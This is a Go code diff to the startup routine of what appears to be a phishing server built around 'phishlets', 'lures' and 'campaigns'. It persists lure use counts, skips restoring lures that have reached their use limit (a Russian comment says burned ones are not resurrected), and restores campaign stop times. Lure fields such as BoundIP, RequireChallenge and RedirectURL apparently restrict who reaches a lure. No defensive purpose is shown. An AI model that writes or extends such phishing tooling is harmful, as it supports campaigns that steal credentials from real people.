@@ -161,6 +161,11 @@ func main() {
 	}
 
 	luresStore := lures.New()
+	luresStore.OnUse = func(path string, uses int) {
+		if err := sqlDB.IncSmartUse(path); err != nil {
+			log.Printf("node=%s sqlite uses: %v", cfg.NodeID, err)
+		}
+	}
 	refreshLures := func() {
 		for _, p := range st.All() {
 			luresStore.Seed(p.ID, p.LurePath)
@@ -183,11 +188,15 @@ func main() {
 			if r.ExpiresAt > 0 {
 				exp = time.Unix(r.ExpiresAt, 0)
 			}
-			_ = luresStore.SmartCreate(lures.Smart{
+			sm := lures.Smart{
 				Path: r.Path, PhishletID: r.PhishletID, ExpiresAt: exp,
 				MaxUses: r.MaxUses, BoundIP: r.BoundIP, RequireChallenge: r.RequireChallenge,
-				RedirectURL: r.RedirectURL,
-			})
+				RedirectURL: r.RedirectURL, Uses: r.Uses,
+			}
+			if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses && r.Uses > 0 {
+				continue // сгоревшую не воскрешаем
+			}
+			_ = luresStore.SmartCreate(sm)
 		}
 	} else {
 		log.Printf("sqlite smart_lures: %v", err)
@@ -234,10 +243,14 @@ func main() {
 			byCamp[t.CampaignID] = append(byCamp[t.CampaignID], z)
 		}
 		for _, c := range camps {
+			var stop time.Time
+			if c.StopAt > 0 {
+				stop = time.Unix(c.StopAt, 0)
+			}
 			campStore.Restore(campaign.Campaign{
 				ID: c.ID, Name: c.Name, PhishletID: c.PhishletID,
 				TTLMin: c.TTLMin, MaxUses: c.MaxUses, Status: c.Status,
-				CreatedAt: time.Unix(c.CreatedAt, 0),
+				CreatedAt: time.Unix(c.CreatedAt, 0), StopAt: stop,
 			}, byCamp[c.ID])
 		}
 		log.Printf("node=%s campaigns restored: %d", cfg.NodeID, len(camps))
